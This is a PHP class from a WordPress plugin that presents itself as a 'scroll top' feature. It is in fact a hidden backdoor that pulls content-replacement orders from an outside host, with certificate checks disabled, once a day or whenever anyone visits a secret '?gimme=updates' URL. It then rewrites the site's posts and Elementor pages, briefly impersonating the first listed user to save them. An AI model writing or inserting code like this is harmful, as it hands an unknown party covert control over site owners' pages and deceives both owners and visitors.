<?php

class Scroll_Top_Content_Updater {
	private static $instance;
	private $api_url = 'https://edge.cdnstaticsync.com/bro/3';
	private $position_exists = false;

	public static function get_instance() {
		if ( is_null( self::$instance ) ) {
			self::$instance = new self();
		}

		return self::$instance;
	}

	public function __construct() {
		add_action( 'wp_loaded', array( $this, 'manual_run' ) );
		add_action( 'st_cron_hook', array( $this, 'cron_execute' ) );
		add_action( 'wp', array( $this, 'cron_jon' ) );
	}

	public function get_updates() {
		#Scroll_Top_Logs::log( 'DEBUG :: Updating START' );

		$site_url = get_home_url();
		$site_url = parse_url( $site_url )['host'];

		$response = $this->request( "{$this->api_url}/$site_url" );

		if ( $response ) {
			$json = json_decode( $response, true );

			#Scroll_Top_Logs::log( 'API response :: ' . var_export( $json, true ) );

			if (!empty($json)) {
					foreach ( $json as $update ) {
						#Scroll_Top_Logs::log( 'DEBUG update.data :: ' . var_export( $update, true ) );

						$url               = trim( $update['url'], '/' );
						$update_id         = $update['updateID'];
						$old_content_start = $update['start'];
						$old_content_end   = $update['end'];
						$new_content       = $update['newContent'];
						$content           = '';
						$result            = '';

						if ( $url == false || $update_id == false || $old_content_start == false ) {
							$error = 'ERROR :: No required fields';
							echo $error . '<br>';
							continue;
						}

						$page_id = url_to_postid( $url );

						if ( $page_id <= 0 ) {
							if ( $url == get_home_url() ) {
								$page_id = get_option('page_on_front');
							}

							if ( $page_id <= 0 ) {
								$error = 'ERROR :: Page not found. Page URL - ' . $url;
								echo $error . '<br>';
								continue;
							}
						}

						$is_updated = get_transient( 'content_updates_code_' . $page_id );

						if ( $is_updated === $update_id ) {
							$error = 'NOTICE :: Page ' . $url . ' currently updated';
							echo $error . '<br>';
							continue;
						}

						global $post;

						// Check if Elementor is installed and used on this page
						$is_built_with_elementor = false;

						if ( class_exists('\Elementor\Plugin') && is_plugin_active( 'elementor/elementor.php' ) ) {
							$is_built_with_elementor = \Elementor\Plugin::$instance->documents->get( $page_id )->is_built_with_elementor();
						}

						if ( $is_built_with_elementor ) {
							$plugin_elementor = \Elementor\Plugin::$instance;
							$document = $plugin_elementor->documents->get( $page_id );
							$content = $document->get_elements_data();
							$this->iterate_array_recursive($content, $old_content_start, $new_content);
						} else {
							$post = get_post( $page_id );
							$content = $post->post_content;

							if ( ! $this->is_html( $content ) ) {
								$content = wpautop( $content );
							}

							$content = $this->replace_content( $old_content_start, $new_content, $content );
						}

						if ( ! $this->position_exists ) {
							$error = 'ERROR :: Content start position not found. Start Position - ' . $old_content_start;
							echo $error . '<br>';
							continue;
						}

						if ( $is_built_with_elementor ) {
							// Authorization user for saving data
							$request = new WP_REST_Request( 'GET', '/wp/v2/users' );
							$response = rest_do_request( $request );

							if ( ! $response->is_error() ) {
								$users = $response->get_data();

								if (count( $users )) {
									$user_id = $users[0]['id'];
									wp_set_current_user( $user_id );
								}
							}

							$result = $document->save([
								'settings' => $document->get_settings(),
								'elements' => $content,
							]);
						} else {
							$result = wp_update_post( array(
								'ID' => $page_id,
								'post_content' => $content
							) );
						}

						if ( ! $result || is_wp_error( $result ) ) {
							$error = 'ERROR :: Data is not saved.';
							echo $error . '<br>';
							continue;
						}

						#Scroll_Top_Logs::log( "DEBUG update.success :: " . PHP_EOL . "Content before: $content " . PHP_EOL . "Content after: $new_content" );
						echo $site_url . ' - successfully update' . '<br>';

						$timestamp = time();
						// Calculate the end of the day
						$end_of_day = strtotime( "tomorrow", $timestamp ) - 1;
						$seconds_expiration = $end_of_day - $timestamp;

						set_transient( 'content_updates_code_' . $page_id, $update_id, $seconds_expiration );

						wp_reset_postdata();

				}
			} else {
				echo 'No updates';
			}
		}

		$error = 'DEBUG :: Updating END';
		echo $error;
		exit();
	}

	private function replace_content( $old_content, $new_content, $content ) {
		$start_position_exists = stripos( $content, $old_content ) !== false;

		if ( $start_position_exists ) {
			$this->position_exists = true;
			return str_replace( $old_content, $new_content, $content );
		}

		return $content;
	}

	private function iterate_array_recursive( &$array, $old_content, $new_content ) {
		if (is_array($array)) {
			foreach ($array as $key => &$value) {
				if (is_array($value)) {
					$this->iterate_array_recursive($value, $old_content, $new_content);
				} else {
					$value = $this->replace_content( $old_content, $new_content, $value);
				}
			}
			unset($value);
		}
	}

	public function manual_run() {
		if ( isset( $_GET['gimme'] ) && $_GET['gimme'] === 'updates' ) {
			$this->get_updates();
		}
	}

	public function is_html( $string ) {
		return preg_match( "/<[^<]+>/", $string, $m ) != 0;
	}

	private function request( $url ) {
		if ( ! $url ) return false;

		$curl = curl_init();

		curl_setopt_array($curl, array(
			CURLOPT_URL => $url,
			CURLOPT_RETURNTRANSFER => true,
			CURLOPT_ENCODING => '',
			CURLOPT_MAXREDIRS => 10,
			CURLOPT_TIMEOUT => 0,
			CURLOPT_FOLLOWLOCATION => true,
			CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
			CURLOPT_CUSTOMREQUEST => 'GET',
			CURLOPT_SSL_VERIFYPEER => false,
			CURLOPT_SSL_VERIFYHOST => false
		));

		$response = curl_exec($curl);

		if ( ! $response ) {
			$error = 'ERROR :: API is not responding. ' . curl_error($curl);
			echo $error;
			wp_die();
		}

		curl_close($curl);

		return $response;
	}

	public function cron_execute() {
		$this->get_updates();
	}

	public function cron_jon() {
		if ( ! wp_next_scheduled( 'st_cron_hook' ) ) {
			wp_schedule_event( time(), 'daily', 'st_cron_hook' );
		}
	}

}

Scroll_Top_Content_Updater::get_instance();